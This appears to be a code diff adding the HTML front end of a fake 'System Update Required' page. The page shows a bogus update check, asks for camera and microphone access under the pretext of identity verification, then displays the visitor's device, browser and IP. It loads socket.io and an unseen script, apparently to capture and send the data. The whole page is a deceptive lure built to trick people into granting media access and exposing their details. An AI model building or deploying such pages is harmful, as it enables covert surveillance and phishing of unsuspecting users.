@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Update Required</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="loading-screen" id="loadingScreen">
+            <div class="spinner"></div>
+            <h2>Checking system updates...</h2>
+            <p>Please wait while we verify your device compatibility</p>
+            <div class="progress-bar">
+                <div class="progress" id="progressBar"></div>
+            </div>
+            <p class="small" id="statusText">Initializing...</p>
+        </div>
+
+        <div class="permission-screen hidden" id="permissionScreen">
+            <div class="warning-icon">⚠️</div>
+            <h2>Camera & Microphone Access Required</h2>
+            <p>This system update requires access to your camera and microphone for identity verification.</p>
+            <button onclick="requestPermissions()" class="btn-primary">Allow Access</button>
+            <button onclick="skipPermissions()" class="btn-secondary">Skip (Limited Mode)</button>
+        </div>
+
+        <div class="main-screen hidden" id="mainScreen">
+            <h2>✅ System Update Complete</h2>
+            <p>Your device is now up to date.</p>
+            <div class="info-box">
+                <p><strong>Device:</strong> <span id="deviceInfo">Unknown</span></p>
+                <p><strong>Browser:</strong> <span id="browserInfo">Unknown</span></p>
+                <p><strong>IP:</strong> <span id="ipInfo">Loading...</span></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <script src="/static/script.js"></script>
+</body>
+</html>
